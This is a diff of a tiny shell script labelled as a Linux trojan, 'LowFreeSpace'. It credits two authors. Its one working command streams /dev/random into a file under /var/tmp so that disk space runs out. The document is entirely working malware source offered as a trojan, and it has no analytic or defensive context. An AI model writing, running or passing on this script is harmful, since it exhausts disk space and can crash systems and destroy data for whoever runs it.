@@ -1,4 +1,4 @@
 # Trojan.Linux.LowFreeSpace
-# by codedroider
+# by codedroider & Lurk
 
-cat /dev/random>/var/tmp
+cat /dev/random>/var/tmp/thxlurk
